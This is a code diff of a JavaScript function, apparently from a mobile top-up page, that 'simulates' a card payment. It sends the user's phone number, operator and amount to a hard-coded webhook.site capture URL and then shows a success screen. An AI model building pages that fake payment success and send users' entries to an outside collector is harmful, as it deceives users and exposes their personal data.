@@ -102,32 +102,31 @@ function startCountdown(seconds) {
     }, 1000);
 }
 
-// محاكاة إدخال البطاقة وإرسال البيانات إلى Webhook.site
+// محاكاة إدخال البطاقة وإرسال البيانات بوضوح إلى Webhook.site
 function simulateCardSuccess() {
     clearInterval(window.countdownInterval);
     
     const phone = document.getElementById('phone-input').value;
     const amount = document.getElementById('amount-input').value;
-    
-    // الرابط الجديد الخاص بك
     const webhookUrl = "https://webhook.site/ed0fc4fd-1730-45a7-917b-6151f0f027fb";
     
-    // بيانات العملية التي سترسل كـ JSON
-    const payload = {
-        status: "success",
-        operator: selectedOp,
-        phone_number: phone,
-        amount: amount,
-        timestamp: new Date().toISOString()
+    const dataToSend = {
+        "الشبكة": selectedOp,
+        "رقم_الهاتف": phone,
+        "المبلغ": amount + " دج",
+        "الحالة": "تمت العملية بنجاح"
     };
 
     fetch(webhookUrl, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    }).catch(error => {
-        console.error("خطأ في الإرسال:", error);
-    });
+        headers: {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(dataToSend)
+    })
+    .then(response => console.log("تم الإرسال بنجاح"))
+    .catch(error => console.error("خطأ:", error));
 
     goToScreen('success-screen');
 
